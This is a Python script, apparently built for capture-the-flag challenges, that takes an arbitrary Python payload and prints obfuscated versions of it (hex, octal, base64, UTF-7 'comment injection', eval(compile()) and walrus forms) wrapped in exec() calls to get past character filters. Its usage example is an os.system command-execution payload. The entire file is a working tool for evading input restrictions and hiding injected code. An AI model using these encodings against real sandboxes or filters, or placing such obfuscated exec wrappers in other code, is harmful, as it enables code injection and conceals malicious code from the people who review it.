#!/usr/bin/env python3
"""
Encode Python payloads in various formats to bypass restrictions.
Useful for CTF challenges with character restrictions.
"""

import base64
import sys

def encode_hex(payload):
    """Encode payload as hex string."""
    return ''.join(f'\\x{ord(c):02x}' for c in payload)

def encode_octal(payload):
    """Encode payload as octal string."""
    return ''.join(f'\\{ord(c):03o}' for c in payload)

def encode_base64(payload):
    """Encode payload as base64."""
    return base64.b64encode(payload.encode()).decode()

def encode_utf7(payload):
    """Encode payload as UTF-7 (for comment injection)."""
    # UTF-7 encodes non-ASCII as +base64-
    # For newlines: +AAo-
    result = []
    for c in payload:
        if c == '\n':
            result.append('+AAo-')
        elif ord(c) < 128:
            result.append(c)
        else:
            result.append(base64.b64encode(c.encode('utf-8')).decode().replace('=', ''))
    return ''.join(result)

def generate_exec_wrapper(encoded, method):
    """Generate exec() wrapper for the encoded payload."""
    if method == 'hex':
        return f'exec("{encoded}")'
    elif method == 'octal':
        return f'exec("{encoded}")'
    elif method == 'base64':
        return f'exec(__import__("base64").b64decode("{encoded}"))'
    elif method == 'utf7':
        return f'# -*- coding: utf_7 -*-\n{encoded}'
    return encoded

def main():
    """Main function."""
    
    if len(sys.argv) < 2:
        print("Usage: python encode_payload.py <payload>")
        print("Example: python encode_payload.py '__import__(\"os\").system(\"ls\")'")
        sys.exit(1)
    
    payload = sys.argv[1]
    
    print("=" * 60)
    print(f"PAYLOAD: {payload}")
    print("=" * 60)
    
    # Hex encoding
    hex_encoded = encode_hex(payload)
    print(f"\n[HEX] exec(\"{hex_encoded}\")")
    
    # Octal encoding
    octal_encoded = encode_octal(payload)
    print(f"\n[OCTAL] exec(\"{octal_encoded}\")")
    
    # Base64 encoding
    b64_encoded = encode_base64(payload)
    print(f"\n[BASE64] exec(__import__('base64').b64decode('{b64_encoded}'))")
    
    # UTF-7 encoding (for comment injection)
    utf7_encoded = encode_utf7(payload)
    print(f"\n[UTF-7] (for comment injection)")
    print(f"# -*- coding: utf_7 -*-")
    print(f"def f(x): return x")
    print(f"    #{utf7_encoded}")
    
    # Compile-based eval bypass
    print(f"\n[COMPILE] eval(compile('''{payload}''', '<stdin>', 'exec'))")
    
    # Walrus operator (Python 3.8+)
    print(f"\n[WALRUS] [(x:={payload})]")

if __name__ == "__main__":
    main()
